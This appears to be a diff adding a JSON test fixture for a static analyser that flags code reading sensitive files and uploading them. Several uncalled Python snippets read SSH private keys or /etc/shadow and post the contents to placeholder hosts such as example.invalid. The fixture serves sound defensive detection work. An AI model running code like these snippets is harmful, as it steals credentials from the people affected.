@@ -1,0 +1,50 @@
+[
+  {
+    "name": "Joined sensitive path and Session upload",
+    "purpose": "Expected possible flow; the function is never called.",
+    "expected_upload_findings": 1,
+    "source": ["def example_only():", "    import os, requests", "    account = 'falcon-demo'", "    path = os.path.join(f'/home/{account}', '.ssh', 'id_example')", "    contents = open(path).read()", "    with requests.Session() as client:", "        client.post('https://example.invalid/upload', data=contents)"]
+  },
+  {
+    "name": "Ordinary public notes upload",
+    "purpose": "Ordinary uploads should not be labeled sensitive-file flows.",
+    "expected_upload_findings": 0,
+    "source": ["def example_only():", "    import os, requests", "    path = os.path.join('/tmp', 'public-notes.txt')", "    contents = open(path).read()", "    client = requests.Session()", "    client.put('https://example.invalid/notes', data=contents)"]
+  },
+  {
+    "name": "Sensitive local read, unrelated status upload",
+    "purpose": "Do not connect two operations merely because both occur in one file.",
+    "expected_upload_findings": 0,
+    "source": ["def example_only():", "    import requests", "    contents = open('/home/falcon-demo/.ssh/id_example').read()", "    client = requests.Session()", "    client.post('https://example.invalid/status', data='Backup started')"]
+  },
+  {
+    "name": "Documented authorized backup",
+    "purpose": "A comment does not prove authorization; report the flow while explaining legitimate use.",
+    "expected_upload_findings": 1,
+    "source": ["def example_only():", "    # Intended authorized backup: review who controls the recipient.", "    from pathlib import Path", "    from requests import Session", "    path = Path('/home/falcon-demo') / '.ssh' / 'id_example'", "    contents = path.read_bytes()", "    with Session() as client:", "        client.post('https://backup.example.invalid', data=contents)"]
+  },
+  {
+    "name": "Literal path in a status message",
+    "purpose": "Sending a path string is not the same as reading and sending its contents.",
+    "expected_upload_findings": 0,
+    "source": ["def example_only():", "    import requests", "    client = requests.Session()", "    client.post('https://example.invalid/status', data='/etc/shadow')"]
+  },
+  {
+    "name": "Absolute component replaces earlier path",
+    "purpose": "Respect join semantics to avoid claiming the discarded sensitive path was read.",
+    "expected_upload_findings": 0,
+    "source": ["def example_only():", "    import os, requests", "    path = os.path.join('/etc/shadow', '/tmp/public-notes.txt')", "    contents = open(path).read()", "    requests.post('https://example.invalid', data=contents)"]
+  },
+  {
+    "name": "Unknown path origin",
+    "purpose": "A documented limitation: unknown inputs are not guessed; no finding does not establish safety.",
+    "expected_upload_findings": 0,
+    "source": ["def example_only(base):", "    import os, requests", "    path = os.path.join(base, '.ssh', 'id_example')", "    contents = open(path).read()", "    requests.post('https://example.invalid', data=contents)"]
+  },
+  {
+    "name": "Payload replaced before upload",
+    "purpose": "Discard stale data connections after reassignment.",
+    "expected_upload_findings": 0,
+    "source": ["def example_only():", "    import requests", "    contents = open('/etc/shadow').read()", "    contents = 'public status'", "    requests.Session().post('https://example.invalid', data=contents)"]
+  }
+]
